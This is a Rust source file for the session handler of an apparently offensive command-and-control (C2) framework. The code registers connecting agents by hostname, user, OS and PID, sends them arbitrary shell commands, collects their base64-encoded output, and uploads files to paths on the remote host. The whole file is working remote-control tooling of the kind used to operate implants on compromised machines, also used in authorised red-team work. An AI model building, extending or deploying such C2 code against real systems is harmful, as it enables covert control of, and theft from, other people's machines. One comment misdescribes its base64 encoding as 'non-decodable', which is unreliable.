//! Session handler — manages command execution for a single agent session.
//!
//! Protocol handling:
//! - Reads RCF_SYSINFO block on connect
//! - Reads RCF_OUTPUT blocks (base64-encoded stdout/stderr + exit code)
//! - Sends commands and RCF_EXIT

use std::sync::Arc;

use tokio::io::{AsyncBufReadExt, AsyncWriteExt, BufReader};
use tokio::net::TcpStream;
use tokio::sync::mpsc;
use tracing::{debug, info, warn};

use crate::session::{SessionManager, SessionCommand};

/// Decodes base64 string to bytes.
fn base64_decode(input: &str) -> Vec<u8> {
    let table = |b: u8| -> u8 {
        match b {
            b'A'..=b'Z' => b - b'A',
            b'a'..=b'z' => b - b'a' + 26,
            b'0'..=b'9' => b - b'0' + 52,
            b'+' => 62,
            b'/' => 63,
            _ => 0,
        }
    };

    let bytes: Vec<u8> = input.bytes().filter(|&b| b != b'\n' && b != b'\r' && b != b' ').collect();
    let mut result = Vec::with_capacity(bytes.len() * 3 / 4);

    let chunks = bytes.chunks_exact(4);
    let remainder = chunks.remainder();

    for chunk in chunks {
        let n = ((table(chunk[0]) as u32) << 18)
            | ((table(chunk[1]) as u32) << 12)
            | ((table(chunk[2]) as u32) << 6)
            | (table(chunk[3]) as u32);
        result.push((n >> 16) as u8);
        result.push(((n >> 8) & 0xFF) as u8);
        result.push((n & 0xFF) as u8);
    }

    if remainder.len() >= 2 {
        let n = ((table(remainder[0]) as u32) << 18)
            | ((table(remainder[1]) as u32) << 12);
        result.push((n >> 16) as u8);
        if remainder.len() >= 3 && remainder[2] != b'=' {
            result.push(((n >> 8) & 0xFF) as u8);
        }
    }

    result
}

/// Handles a single C2 session.
pub struct SessionHandler {
    session_num: u32,
    sessions: Arc<SessionManager>,
}

impl SessionHandler {
    pub fn new(session_num: u32, sessions: Arc<SessionManager>) -> Self {
        Self {
            session_num,
            sessions,
        }
    }

    /// Read a line from the reader, stripping trailing \n and \r.
    async fn read_line(reader: &mut BufReader<TcpStream>) -> std::io::Result<String> {
        let mut buf = String::new();
        reader.read_line(&mut buf).await?;
        Ok(buf.trim_end_matches(&['\n', '\r'][..]).to_string())
    }

    /// Run the session handler loop.
    pub async fn run(
        self,
        socket: TcpStream,
        mut rx: mpsc::Receiver<SessionCommand>,
    ) -> anyhow::Result<()> {
        let peer = socket.peer_addr()?;
        let local = socket.local_addr()?;

        info!("Session {} connected from {}", self.session_num, peer.ip());

        // Update session with addresses
        self.sessions
            .update_session_info(self.session_num, &local.to_string(), &format!("connected from {}", peer.ip()))
            .await;

        let mut reader = BufReader::new(socket);

        // ── Phase 1: Read sysinfo from agent ─────────────────────────────
        let sysinfo = Self::read_sysinfo_block(&mut reader).await;
        if let Some(ref info_str) = sysinfo {
            info!("Session {} sysinfo: {}", self.session_num, info_str);

            // Parse sysinfo and update session
            if let Ok(json) = serde_json::from_str::<serde_json::Value>(info_str) {
                let hostname = json.get("hostname").and_then(|v| v.as_str()).unwrap_or("?");
                let username = json.get("username").and_then(|v| v.as_str()).unwrap_or("?");
                let os = json.get("os").and_then(|v| v.as_str()).unwrap_or("?");
                let arch = json.get("arch").and_then(|v| v.as_str()).unwrap_or("?");
                let pid = json.get("pid").and_then(|v| v.as_u64()).unwrap_or(0);
                let cwd = json.get("cwd").and_then(|v| v.as_str()).unwrap_or("?");

                let session_info = format!(
                    "{} | {}@{} | PID:{} | CWD:{}",
                    os, username, hostname, pid, cwd
                );
                self.sessions.update_session_info(
                    self.session_num,
                    &local.to_string(),
                    &format!("{} ({}/{})", session_info, arch, hostname),
                ).await;

                println!("\n[*] Agent connected:");
                println!("    Host:     {}", hostname);
                println!("    User:     {}", username);
                println!("    OS:       {} ({})", os, arch);
                println!("    PID:      {}", pid);
                println!("    CWD:      {}\n", cwd);
            }
        }

        // ── Phase 2: Command loop ────────────────────────────────────────
        loop {
            tokio::select! {
                // Read output from agent
                result = Self::read_line(&mut reader) => {
                    match result {
                        Ok(line) => {
                            if line.is_empty() {
                                continue;
                            }

                            if line == "RCF_OUTPUT" {
                                // Read the output block
                                let (stdout, stderr, exit_code) =
                                    Self::read_output_block(&mut reader).await;

                                if !stdout.is_empty() {
                                    print!("{}", stdout);
                                }
                                if !stderr.is_empty() {
                                    eprint!("[!] Session {} stderr:\n{}", self.session_num, stderr);
                                }
                                if let Some(code) = exit_code
                                    && code != 0 {
                                    eprintln!("[!] Session {} exited with code {}", self.session_num, code);
                                }

                                // Broadcast to control socket subscribers
                                let output_msg = if let Some(code) = exit_code {
                                    format!("{}\n{}\n{}", 
                                        base64_encode_simple(stdout.as_bytes()),
                                        base64_encode_simple(stderr.as_bytes()),
                                        code)
                                } else {
                                    format!("{}\n{}\n-1",
                                        base64_encode_simple(stdout.as_bytes()),
                                        base64_encode_simple(stderr.as_bytes()))
                                };
                                self.sessions.broadcast_output(self.session_num, &output_msg).await;
                            } else if line == "RCF_OUTPUT_END" {
                                // End of output block, nothing extra to do
                            } else {
                                // Unexpected line — might be stray agent output
                                debug!("Session {} unexpected output: {:?}", self.session_num, line);
                            }
                        }
                        Err(e) => {
                            info!("Session {} disconnected: {}", self.session_num, e);
                            break;
                        }
                    }
                }

                // Send command to agent
                Some(cmd) = rx.recv() => {
                    match cmd {
                        SessionCommand::Execute(command) => {
                            if command.trim() == "exit" || command.trim() == "quit" || command.trim() == "RCF_EXIT" {
                                info!("Session {} closing via exit command", self.session_num);
                                let _ = reader.get_mut().write_all(b"RCF_EXIT\n").await;
                                let _ = reader.get_mut().flush().await;
                                break;
                            }

                            // Check for upload command: "upload <local_path> <remote_path>"
                            if let Some((local_path, remote_path)) = parse_upload_command(&command) {
                                if let Err(e) = send_upload(&mut reader, &local_path, &remote_path).await {
                                    warn!("Upload failed for session {}: {}", self.session_num, e);
                                }
                                continue;
                            }

                            debug!("Session {} executing: {}", self.session_num, command);
                            let cmd_with_nl = format!("{}\n", command.trim());
                            if let Err(e) = reader.get_mut().write_all(cmd_with_nl.as_bytes()).await {
                                warn!("Failed to send command to session {}: {}", self.session_num, e);
                                break;
                            }
                            let _ = reader.get_mut().flush().await;
                        }

                        SessionCommand::Data(data) => {
                            if let Err(e) = reader.get_mut().write_all(&data).await {
                                warn!("Failed to send data to session {}: {}", self.session_num, e);
                                break;
                            }
                            let _ = reader.get_mut().flush().await;
                        }

                        SessionCommand::Close => {
                            info!("Session {} closing via command", self.session_num);
                            let _ = reader.get_mut().write_all(b"RCF_EXIT\n").await;
                            let _ = reader.get_mut().flush().await;
                            break;
                        }
                    }
                }
            }
        }

        // Mark session as closed
        self.sessions.kill_session(self.session_num).await;
        info!("Session {} terminated", self.session_num);

        Ok(())
    }

    /// Read the sysinfo block sent by the agent on connect.
    /// Returns the JSON string if successful.
    async fn read_sysinfo_block(reader: &mut BufReader<TcpStream>) -> Option<String> {
        // Expect: RCF_SYSINFO\n<json>\nRCF_SYSINFO_END\n
        let marker = match Self::read_line(reader).await {
            Ok(l) => l,
            Err(e) => {
                warn!("Failed to read sysinfo marker: {}", e);
                return None;
            }
        };

        if marker != "RCF_SYSINFO" {
            warn!("Expected RCF_SYSINFO marker, got: {:?}", marker);
            return None;
        }

        let json = match Self::read_line(reader).await {
            Ok(l) => l,
            Err(e) => {
                warn!("Failed to read sysinfo JSON: {}", e);
                return None;
            }
        };

        let _end_marker = Self::read_line(reader).await; // Consume RCF_SYSINFO_END

        Some(json)
    }

    /// Read an output block from the agent.
    /// Returns (stdout_decoded, stderr_decoded, exit_code).
    async fn read_output_block(reader: &mut BufReader<TcpStream>) -> (String, String, Option<i32>) {
        let stdout_b64 = match Self::read_line(reader).await {
            Ok(l) => l,
            Err(_) => return (String::new(), String::new(), None),
        };

        let stderr_b64 = match Self::read_line(reader).await {
            Ok(l) => l,
            Err(_) => return (String::new(), String::new(), None),
        };

        let exit_code_str = match Self::read_line(reader).await {
            Ok(l) => l,
            Err(_) => return (String::new(), String::new(), None),
        };

        let _end_marker = Self::read_line(reader).await; // Consume RCF_OUTPUT_END

        let stdout = String::from_utf8_lossy(&base64_decode(&stdout_b64)).to_string();
        let stderr = String::from_utf8_lossy(&base64_decode(&stderr_b64)).to_string();
        let exit_code = exit_code_str.parse::<i32>().ok();

        (stdout, stderr, exit_code)
    }
}

// ── Upload helpers ────────────────────────────────────────────────────────────

/// Parse "upload <local> <remote>" command. Returns (local_path, remote_path) if matched.
fn parse_upload_command(cmd: &str) -> Option<(String, String)> {
    let parts: Vec<&str> = cmd.split_whitespace().collect();
    if parts.len() >= 3 && parts[0].to_lowercase() == "upload" {
        Some((parts[1].to_string(), parts[2].to_string()))
    } else {
        None
    }
}

/// Send a file to the agent via RCF_UPLOAD protocol.
async fn send_upload(
    reader: &mut BufReader<TcpStream>,
    local_path: &str,
    remote_path: &str,
) -> anyhow::Result<()> {
    // Read local file
    let file_data = tokio::fs::read(local_path).await
        .map_err(|e| anyhow::anyhow!("Failed to read {}: {}", local_path, e))?;

    // Simple base64 encoder (no external dep needed)
    let b64 = base64_encode(&file_data);

    // Send upload block
    let writer = reader.get_mut();
    writer.write_all(b"RCF_UPLOAD\n").await?;
    writer.write_all(b64.as_bytes()).await?;
    writer.write_all(b"\n").await?;
    writer.write_all(remote_path.as_bytes()).await?;
    writer.write_all(b"\n").await?;
    writer.write_all(b"RCF_UPLOAD_END\n").await?;
    writer.flush().await?;

    info!("Sent {} bytes to agent as {}", file_data.len(), remote_path);

    // Read and display result
    let marker = SessionHandler::read_line(reader).await;
    if let Ok(m) = marker
        && m == "RCF_OUTPUT" {
        let (stdout, stderr, exit_code) = SessionHandler::read_output_block(reader).await;
        if !stdout.is_empty() {
            print!("{}", stdout);
        }
        if !stderr.is_empty() {
            eprintln!("[!] Upload error: {}", stderr);
        }
        if let Some(code) = exit_code
            && code != 0 {
            eprintln!("[!] Upload failed with exit code {}", code);
        }
    }

    Ok(())
}

/// Simple base64 encoder (no external dependency).
fn base64_encode(data: &[u8]) -> String {
    const TABLE: &[u8] = b"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
    let mut result = String::with_capacity(data.len().div_ceil(3) * 4);
    let chunks = data.chunks_exact(3);
    let remainder = chunks.remainder();

    for chunk in chunks {
        let n = ((chunk[0] as u32) << 16) | ((chunk[1] as u32) << 8) | (chunk[2] as u32);
        result.push(TABLE[(n >> 18) as usize] as char);
        result.push(TABLE[((n >> 12) & 0x3F) as usize] as char);
        result.push(TABLE[((n >> 6) & 0x3F) as usize] as char);
        result.push(TABLE[(n & 0x3F) as usize] as char);
    }

    match remainder {
        [a] => {
            let n = (*a as u32) << 16;
            result.push(TABLE[(n >> 18) as usize] as char);
            result.push(TABLE[((n >> 12) & 0x3F) as usize] as char);
            result.push('=');
            result.push('=');
        }
        [a, b] => {
            let n = ((*a as u32) << 16) | ((*b as u32) << 8);
            result.push(TABLE[(n >> 18) as usize] as char);
            result.push(TABLE[((n >> 12) & 0x3F) as usize] as char);
            result.push(TABLE[((n >> 6) & 0x3F) as usize] as char);
            result.push('=');
        }
        _ => {}
    }

    result
}

/// Simple base64 encoder for broadcast messages (non-decodable, just for transport).
fn base64_encode_simple(data: &[u8]) -> String {
    base64_encode(data)
}
